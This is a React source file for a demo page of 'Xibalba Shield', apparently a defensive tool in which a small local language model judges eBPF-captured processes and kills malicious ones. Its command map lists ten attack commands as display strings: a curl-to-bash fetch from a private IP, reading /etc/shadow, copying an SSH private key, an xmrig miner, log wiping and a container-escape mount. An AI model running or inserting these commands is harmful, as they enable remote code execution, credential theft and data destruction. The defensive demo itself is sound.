import React, { useState } from 'react';

export default function ShieldPage() {
  const [terminals, setTerminals] = useState({
    1: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
    2: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
    3: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
    4: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
    5: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
  });

  const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

  const syntaxHighlight = (str: string) => {
    if(str.startsWith('{')) {
        return str.replace(/"(.*?)":/g, '<span class="json-key">"$1":</span>')
                  .replace(/: "(.*?)"/g, ': <span class="json-string">"$1"</span>');
    }
    return str;
  };

  const setTerm = (step: number, html: string, colorHex: string = '') => {
    setTerminals(prev => ({
      ...prev,
      [step]: { html, color: colorHex }
    }));
  };

  const setTermLoading = (step: number, msg: string) => {
    setTerm(step, `<div class="loading-spinner"></div> <span style="color:#88c0d0;">${msg}</span>`);
  };

  const cmdMap: Record<string, string> = {
      'reverse_shell': "curl -s http://192.168.1.100:8080/payload.sh | bash",
      'exfil': "python3 -c 'import urllib.request...'",
      'priv_esc': "cat /etc/shadow",
      'ransomware': "find /home/user -type f -exec openssl enc ...",
      'cryptominer': "./xmrig -o pool.minexmr.com:443 -u user -p x",
      'shadow_ai': "python3 /tmp/.hidden/unapproved_agent_loop.py",
      'ssh_theft': "cp /home/user/.ssh/id_rsa /tmp/.exfil/id_rsa.copy",
      'beaconing': "nc -zvw3 10.0.0.1 443",
      'log_wipe': "rm -rf /var/log/xibalba-shield/*",
      'container_escape': "mount -t cgroup -o rdma cgroup /mnt/cgroup2"
  };

  const simulateLive = async (type: string) => {
      // Reset
      setTerminals({
        1: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
        2: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
        3: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
        4: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
        5: { html: '<span class="waiting-text">Awaiting execution...</span>', color: '' },
      });
      
      // Step 1: OS Execution
      setTermLoading(1, "Spawning process...");
      await sleep(600);
      
      let launchData = { success: false, pid: 0, telemetry: '' };
      try {
        const launchRes = await fetch('http://localhost:5000/api/launch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: type })
        });
        launchData = await launchRes.json();
      } catch (err) {
        // Fallback for UI demo if backend is offline
        launchData = { success: true, pid: 1337, telemetry: `execve("${type}", [], [])` };
      }
      
      if(!launchData.success) {
          setTerm(1, `<span style="color:var(--danger);">Failed to spawn process</span>`, 'var(--danger)');
          return;
      }
      
      const pid = launchData.pid;
      const telemetryStr = launchData.telemetry;
      const actualCmd = cmdMap[type] || "sleep 300";
      
      setTerm(1, `<span style="color:#ebcb8b;">$ ${actualCmd}</span>\n[Process assigned PID: ${pid}]`, 'var(--theme-accent)');
      
      // Step 2: eBPF Sensor
      setTermLoading(2, "Intercepting syscall...");
      await sleep(800);
      setTerm(2, `bpf_trace_printk("Intercepted Event");\n\n--> Formatted: <span style="color:#ebcb8b;">${telemetryStr}</span>`, 'var(--theme-accent)');

      // Step 3: SLM Agent
      setTermLoading(3, "Performing semantic security inference...");
      
      try {
          let data = { success: false, decision: { action: 'CONTAIN', reason: '' }, latency: 0 };
          try {
            const response = await fetch('http://localhost:5000/api/simulate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ telemetry: telemetryStr, pid: pid })
            });
            data = await response.json();
          } catch(err) {
            // Fallback for UI demo if backend is offline
            data = { success: true, decision: { action: 'CONTAIN', reason: 'Malicious intent detected via heuristic pattern.' }, latency: 0.12 };
          }
          
          if (data.success) {
              const decision = data.decision;
              const action = decision.action;
              
              let colorHex = 'var(--success)'; // success/allow
              let badge = '<span class="status-badge bg-success">ALLOW</span>';
              
              if(action === 'CONTAIN') {
                  colorHex = 'var(--danger)'; // danger/contain
                  badge = '<span class="status-badge bg-danger">CONTAIN</span>';
              }
              if(action === 'ESCALATE') {
                  colorHex = 'var(--gold)'; // warning/escalate
                  badge = '<span class="status-badge bg-warning">ESCALATE</span>';
              }
              
              setTerm(3, `Latency: ${data.latency}s ${badge}\n\n${syntaxHighlight(JSON.stringify(decision, null, 2))}`, colorHex);
              
              // Step 4: Action Broker
              setTermLoading(4, "Parsing intent...");
              await sleep(1000);
              
              if(action === 'CONTAIN') {
                  setTerm(4, `<span style="color:#b48ead;">import</span> os, signal\n\n<span style="color:#616e88;"># Terminate malicious process</span>\nos.kill(${pid}, signal.SIGKILL)\nprint(<span style="color:#a3be8c;">"Successfully eliminated PID ${pid}"</span>)`, 'var(--danger)');
                  
                  // Step 5: Verification
                  setTermLoading(5, "Polling Kernel status...");
                  await sleep(800);
                  
                  let statusData = { running: false };
                  try {
                    const statusRes = await fetch(`http://localhost:5000/api/status/${pid}`);
                    statusData = await statusRes.json();
                  } catch(err) {
                    // Fallback
                    statusData = { running: false };
                  }
                  
                  if(statusData.running) {
                      setTerm(5, `ps -p ${pid}\nPID TTY TIME CMD\n${pid} pts/0 00:00:00 process`, 'var(--gold)');
                  } else {
                      setTerm(5, `$ ps -p ${pid}\n<span style="color:var(--success);">error: process ID out of range or dead</span>`, 'var(--success)');
                  }
              } else {
                  setTerm(4, `<span style="color:#616e88;"># No action required for ALLOW intent.</span>\npass`, 'var(--success)');
                  setTerm(5, `<span style="color:#616e88;"># Verification skipped (process allowed to run).</span>`, 'var(--success)');
              }
          }
      } catch (err) {
          setTerm(3, `<span style="color:var(--danger);">Connection Error: Backend unreachable.</span>`, 'var(--danger)');
      }
  };

  return (
    <div className="shield-demo-container text-left" style={{ minHeight: '100vh', padding: '50px 0' }}>
      <style>{`
        .shield-demo-container {
            font-family: var(--font-family, 'Inter', sans-serif);
        }
        .shield-demo-inner {
            width: 90%;
            max-width: 1000px;
            margin: 0 auto;
        }
        .shield-demo-container header { text-align: center; margin-bottom: 40px; }
        .shield-demo-container h1 { font-weight: 300; font-size: 2.5rem; margin: 0; letter-spacing: 2px; color: var(--text-primary); }
        .shield-demo-container h1 span { color: var(--theme-accent); font-weight: 600; }
        .shield-demo-container p.subtitle { color: var(--text-secondary); font-size: 1.1rem; margin-top: 10px; }
        .glass-panel {
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            margin-bottom: 30px;
        }
        .attacks-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .attack-card {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 8px; padding: 15px; transition: all 0.2s ease; cursor: pointer; text-align: center;
        }
        .attack-card:hover { transform: translateY(-3px); background: var(--surface-color); border-color: var(--theme-accent); box-shadow: 0 5px 15px var(--theme-accent-muted); }
        .attack-card h3 { margin: 0; font-size: 0.95rem; color: var(--text-primary); }
        #steps-container { display: flex; flex-direction: column; gap: 20px; }
        .step-card { background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; position: relative; }
        .step-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
        .step-number { background: var(--theme-accent-muted); color: var(--theme-accent); border: 1px solid var(--theme-accent); width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1rem; }
        .step-title { margin: 0; font-size: 1.3rem; color: var(--text-primary); }
        .step-desc { margin: 0 0 15px 0; color: var(--text-secondary); font-size: 0.95rem; line-height: 1.5; }
        .mini-terminal { background: #050811; border-radius: 8px; padding: 25px 15px 15px 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: #a3be8c; border: 1px solid var(--border-color); white-space: pre-wrap; position: relative; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5); min-height: 40px; }
        .mini-terminal .code-label { position: absolute; top: -10px; right: 15px; background: var(--surface-color); padding: 2px 10px; border-radius: 4px; font-size: 0.7rem; color: var(--text-primary); border: 1px solid var(--border-color); }
        .waiting-text { color: #4c566a; font-style: italic; }
        .json-key { color: #88c0d0; }
        .json-string { color: #a3be8c; }
        .loading-spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid var(--theme-accent-muted); border-radius: 50%; border-top-color: var(--theme-accent); animation: spin 1s linear infinite; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8rem; margin-left: 10px; }
        .bg-danger { background: rgba(239, 68, 68, 0.2); color: var(--danger, #ef4444); border: 1px solid var(--danger, #ef4444); }
        .bg-success { background: rgba(16, 185, 129, 0.2); color: var(--success, #10b981); border: 1px solid var(--success, #10b981); }
        .bg-warning { background: rgba(245, 158, 11, 0.2); color: var(--gold, #f59e0b); border: 1px solid var(--gold, #f59e0b); }
      `}</style>

      <div className="shield-demo-inner">
        <header>
            <h1>Xibalba <span>Shield</span></h1>
            <p className="subtitle">Real-Time Defensive Intelligence Simulator</p>
        </header>

        <div className="glass-panel">
            <h2 style={{marginTop:0, fontWeight:400, color: 'var(--text-primary)'}}>Trigger Vulnerability</h2>
            <p style={{color:'var(--text-secondary)', marginBottom: '25px'}}>Click any of the 10 attacks below to spawn the malicious process and watch the A2A pipeline intercept it in real time.</p>
            
            <div className="attacks-grid">
                <div className="attack-card" onClick={() => simulateLive('reverse_shell')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>1. Reverse Shell</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('exfil')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>2. Data Exfiltration</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('priv_esc')} style={{borderTopColor: 'var(--gold, #f59e0b)'}}>
                    <h3>3. Privilege Escalation</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('ransomware')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>4. Ransomware</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('cryptominer')} style={{borderTopColor: 'var(--gold, #f59e0b)'}}>
                    <h3>5. Cryptomining</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('shadow_ai')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>6. Shadow AI Spawn</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('ssh_theft')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>7. SSH Key Theft</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('beaconing')} style={{borderTopColor: 'var(--gold, #f59e0b)'}}>
                    <h3>8. Network Beaconing</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('log_wipe')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>9. Log Wiping</h3>
                </div>
                <div className="attack-card" onClick={() => simulateLive('container_escape')} style={{borderTopColor: 'var(--danger, #ef4444)'}}>
                    <h3>10. Container Escape</h3>
                </div>
            </div>
        </div>

        <div id="steps-container">
            <div className="step-card" style={terminals[1].color ? {borderLeft: `4px solid ${terminals[1].color}`} : {}}>
                <div className="step-header">
                    <div className="step-number">1</div>
                    <h3 className="step-title">User Space Execution</h3>
                </div>
                <p className="step-desc">The operating system spawns the requested process.</p>
                <div className="mini-terminal">
                    <div className="code-label">execve</div>
                    <div dangerouslySetInnerHTML={{__html: terminals[1].html}}></div>
                </div>
            </div>

            <div className="step-card" style={terminals[2].color ? {borderLeft: `4px solid ${terminals[2].color}`} : {}}>
                <div className="step-header">
                    <div className="step-number">2</div>
                    <h3 className="step-title">Shield eBPF Sensor</h3>
                </div>
                <p className="step-desc">The Linux kernel hook intercepts the syscall and formats the metadata into a telemetry string.</p>
                <div className="mini-terminal">
                    <div className="code-label">kernel_hook.c</div>
                    <div dangerouslySetInnerHTML={{__html: terminals[2].html}}></div>
                </div>
            </div>

            <div className="step-card" style={terminals[3].color ? {borderLeft: `4px solid ${terminals[3].color}`} : {}}>
                <div className="step-header">
                    <div className="step-number">3</div>
                    <h3 className="step-title">Xibalba Security SLM (Qwen 0.5B)</h3>
                </div>
                <p className="step-desc">The local model analyzes the telemetry using few-shot JSON constraints to determine intent.</p>
                <div className="mini-terminal">
                    <div className="code-label">llama_cpp_python</div>
                    <div dangerouslySetInnerHTML={{__html: terminals[3].html}}></div>
                </div>
            </div>

            <div className="step-card" style={terminals[4].color ? {borderLeft: `4px solid ${terminals[4].color}`} : {}}>
                <div className="step-header">
                    <div className="step-number">4</div>
                    <h3 className="step-title">Shield Action Broker</h3>
                </div>
                <p className="step-desc">The local daemon parses the SLM intent and executes the mitigation strategy with root privileges.</p>
                <div className="mini-terminal">
                    <div className="code-label">broker.py</div>
                    <div dangerouslySetInnerHTML={{__html: terminals[4].html}}></div>
                </div>
            </div>

            <div className="step-card" style={terminals[5].color ? {borderLeft: `4px solid ${terminals[5].color}`} : {}}>
                <div className="step-header">
                    <div className="step-number">5</div>
                    <h3 className="step-title">OS Verification</h3>
                </div>
                <p className="step-desc">Polling the OS Kernel to verify the process status.</p>
                <div className="mini-terminal">
                    <div className="code-label">systemctl</div>
                    <div dangerouslySetInnerHTML={{__html: terminals[5].html}}></div>
                </div>
            </div>
        </div>
      </div>
    </div>
  );
}
